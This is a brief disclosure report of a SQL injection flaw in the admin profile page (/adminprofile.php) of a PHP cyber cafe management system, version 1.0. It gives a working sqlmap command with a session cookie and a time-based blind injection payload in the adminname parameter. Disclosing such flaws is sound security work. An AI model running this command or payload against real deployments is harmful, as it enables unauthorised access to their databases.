# SQLi vulnerability in Cyber Cafe Management System Project v1.0 of file /adminprofile.php

**vender**:

[PHP Project, PHP Projects Ideas, PHP Latest tutorials, PHP oops Concept](https://phpgurukul.com/)

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**SoftLink**:

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**Vulnerable File**

- /adminprofile.php

**Version**

- V1.0

### POC

```bash
sqlmap -u "http://192.168.93.1/ccms/adminprofile.php" --data="adminname=Admin&username=admin&mobilenumber=8979555556&email=admin@gmail.com&submit=Update"
--cookie="PHPSESSID=q8vu4tgrhj01ikmjm3u469chil" --level=2 
```

```bash
---
Parameter: adminname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: adminname=Admin' RLIKE SLEEP(5) AND 'MNvc'='MNvc&username=admin&mobilenumber=8979555556&email=admin@gmail.com&submit=Update
---
```

![image-20251212115242136](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512121152195.png)